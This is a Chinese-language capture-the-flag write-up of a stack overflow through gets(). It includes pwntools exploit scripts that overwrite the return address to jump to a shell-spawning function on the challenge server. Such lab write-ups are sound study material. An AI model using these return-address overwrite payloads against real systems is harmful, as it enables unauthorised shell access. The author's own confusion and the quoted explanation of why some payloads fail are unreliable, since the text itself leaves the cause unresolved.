## RIP

首先程序拖到IDA看一下代码

![image-20200521120905993](https://static.hack1s.fun/images/2021/02/06/image-20200521120905993.png)

`main`函数的内容就这么短，是一个`gets`引起的溢出，看到这个`char s`距离rbp有Fh

侧边看到还有一个fun函数

![image-20200521121055537](https://static.hack1s.fun/images/2021/02/06/image-20200521121055537.png)

内容直接返回了一个shell



栈内的数据由近到远依次是局部变量、rbp，最后是返回地址

应该要覆盖返回地址到fun函数这里，这个值是`0x401186`

需要覆盖fh个字节的数组s的空间，以及8个字节的ebp

最后填写返回地址

按照这个逻辑写出来的payload是下面这样的

```python
from pwn import*
sh=remote('node3.buuoj.cn',27511)
payload='a'*23+p64(0x401186)
sh.sendline(payload)
sh.interactive()
```

但是不知道为啥执行出来不是这么个效果

在网上查了一些给的exp也是这样的，感觉有点问题

最后发现这样的两个exp可以执行出结果

```python
payload='a'*23+p64(0x401198)+p64(0x401186)
payload='a'*15+p64(0x401186)
```

有点疑惑，15个a的难道不是覆盖了rbp吗，好像没有覆盖返回地址呀

23个a的那个里面`0x401198`是fun函数结束的地址

没想明白是怎么回事，查到了一个资料这样写着

> 看了网上那些wp，经过研究思考发现，应该是他们使用23个‘a’覆盖时，多覆盖了8个’a‘，将Main函数栈顶覆盖了。我们知道call指令是先将当前ip指向位置压入栈的，多覆盖8字节正好将ip覆盖了，导致无法返回，从而get shell失败。
> 解决办法：payload=‘a’ * 23+ p64(0x401198) + p64(0x401186) #0x401198为返回地址

感觉不太对，但是目前还没想明白这个原因是什么